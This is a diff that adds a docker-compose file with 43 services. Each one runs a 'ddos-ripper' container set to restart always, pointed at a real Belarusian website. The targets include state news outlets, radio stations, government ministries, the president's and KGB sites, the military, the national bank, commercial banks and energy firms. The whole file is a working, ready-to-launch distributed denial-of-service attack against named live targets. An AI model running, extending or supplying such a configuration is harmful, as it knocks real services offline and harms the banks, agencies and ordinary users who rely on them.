@@ -1,0 +1,174 @@
+version: '3'
+services:
+  ddos-runner-1:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://belta.by/
+  ddos-runner-2:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://sputnik.by/
+  ddos-runner-3:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.tvr.by/
+  ddos-runner-4:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.sb.by/
+  ddos-runner-5:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://belmarket.by/
+  ddos-runner-6:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.belarus.by/
+  ddos-runner-7:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://belarus24.by/
+  ddos-runner-8:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://ont.by/
+  ddos-runner-9:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.024.by/
+  ddos-runner-10:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.belnovosti.by/
+  ddos-runner-11:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://mogilevnews.by/
+  ddos-runner-12:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.mil.by/
+  ddos-runner-13:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://yandex.by/
+  ddos-runner-14:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.slonves.by/
+  ddos-runner-15:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://www.ctv.by/
+  ddos-runner-16:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://radiobelarus.by/
+  ddos-runner-17:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://radiusfm.by/
+  ddos-runner-18:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://alfaradio.by/
+  ddos-runner-19:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://radiomir.by/
+  ddos-runner-20:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://radiostalica.by/
+  ddos-runner-21:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://radiobrestfm.by/
+  ddos-runner-22:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.tvrmogilev.by/
+  ddos-runner-23:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://minsknews.by/
+  ddos-runner-24:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://zarya.by/
+  ddos-runner-25:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://grodnonews.by/
+  ddos-runner-26:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://rec.gov.by/ru
+  ddos-runner-27:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: www.mil.by
+  ddos-runner-28:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: www.government.by
+  ddos-runner-29:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://president.gov.by/ru
+  ddos-runner-30:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.mvd.gov.by/ru
+  ddos-runner-31:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://www.kgb.by/ru/
+  ddos-runner-32:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: www.prokuratura.gov.by
+  ddos-runner-33:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: www.nbrb.by
+  ddos-runner-34:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://belarusbank.by/
+  ddos-runner-35:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://brrb.by/
+  ddos-runner-36:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.belapb.by/
+  ddos-runner-37:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://bankdabrabyt.by/
+  ddos-runner-38:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://belinvestbank.by/individual
+  ddos-runner-39:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://bgp.by/ru/
+  ddos-runner-40:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.belneftekhim.by
+  ddos-runner-41:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://www.bellegprom.by
+  ddos-runner-42:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.energo.by
+  ddos-runner-43:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://belres.by/ru/
